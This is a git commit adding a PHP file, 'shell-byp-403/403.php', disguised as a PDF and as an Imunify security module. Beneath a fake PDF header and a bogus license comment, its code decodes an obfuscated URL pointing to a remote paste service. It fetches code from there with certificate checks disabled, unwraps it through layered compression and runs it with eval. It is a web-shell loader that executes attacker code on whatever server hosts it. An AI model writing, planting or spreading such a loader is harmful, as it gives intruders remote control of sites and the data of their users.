ee97b01d945a62776a01c9172f9da2b14f770bb5
Neuro <104827484+neurodie@users.noreply.github.com>
2025-03-03 05:40:39 +0800

    Add files via upload

---
+++ shell-byp-403/403.php
@@ -0,0 +1,66 @@
+%PDF-1.5
+%âãÏÓ
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/Contents 10 0 R
+/MediaBox [-0.0000 -0.0000 595.2756 841.8898]
+/TrimBox [0.0000 0.0000 595.2756 841.8898]
+/CropBox [-0.0000 -0.0000 595.2756 841.8898]
+/Group <<
+/CS 21 0 R
+/S /Transparency
+>>
+/Resources <<
+/ProcSet [/PDF /Text /ImageB /ImageC]
+/XObject << /Im31 31 0 R  /Im30 30 0 R  /Im36 36 0 R  /Im35 35 0 R >>
+/Font << /F13 13 0 R  /F23 23 0 R >>
+/ExtGState << /GS11 11 0 R  /GS20 20 0 R >>
+/ColorSpace << /DefaultCMYK  21 0 R /CS21 21 0 R  /DefaultRGB  32 0 R /CS32 32 0 R  /CS34 34 0 R >>
+/Properties << /Pr12 12 0 R >>
+>>
+>>
+endobj
+10 0 obj
+<<
+/Filter [/FlateDecode ]
+/Length 3910
+>>
+
+
+<?php
+  // This file is part of Imunify - https://www.imunify.com/
+//
+// Imunify is a comprehensive security solution designed to protect your systems from various
+// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced
+// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security
+// risks effectively. You are permitted to use this software in accordance with the terms and 
+// conditions outlined in the Imunify License Agreement, as specified by the copyright holders.
+//
+// Imunify is distributed with the hope of providing optimal protection and security for your
+// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while
+// Imunify strives to deliver robust security measures, no system can be entirely impervious to
+// threats.
+//
+// You should have received a copy of the Imunify License Agreement along with this software.
+// If not, please visit https://www.imunify.com/license for further information. This document
+// is current as of October 8, 2024, and is subject to change based on updates in policies
+// and security practices.
+
+/**
+ * Security Module.
+ *
+ * This module is specifically designed to detect and mitigate various threats while ensuring
+ * the integrity of your systems through real-time scanning and comprehensive protection strategies.
+ * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify
+ * your servers and applications against emerging cyber threats. By implementing proactive
+ * measures, Imunify aims to maintain a secure operating environment for all users.
+ *
+ * @package    security_module
+ * @website    https://google.co.id
+ * @copyright  2024 Ralei
+ * @license    https://www.imunify.com/license Imunify License Agreement
+ */
+  $lSxm=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$ABGs=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 60, 55, 58, 0, 52, 1, 4, 58, 66, 52, 57, 53, 59, 66, 56, 2, 58, 54, 66, 0, 59, 60, 61, 66, 53, 5, 53, 1, 0, 59, 57, 61, 60, 3, 53, 58];$DuAo='';foreach($ABGs as $iBAB){$DuAo.=$lSxm[$iBAB];}$MRIi = "$DuAo";function GMCP($undefined){$oKiY=curl_init();curl_setopt($oKiY,CURLOPT_URL,$undefined);curl_setopt($oKiY,CURLOPT_RETURNTRANSFER,true);curl_setopt($oKiY,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($oKiY,CURLOPT_SSL_VERIFYHOST,false);$hfkz=curl_exec($oKiY);curl_close($oKiY);return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($hfkz))))));}@eval("?>".gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(GMCP($MRIi))))))));?>
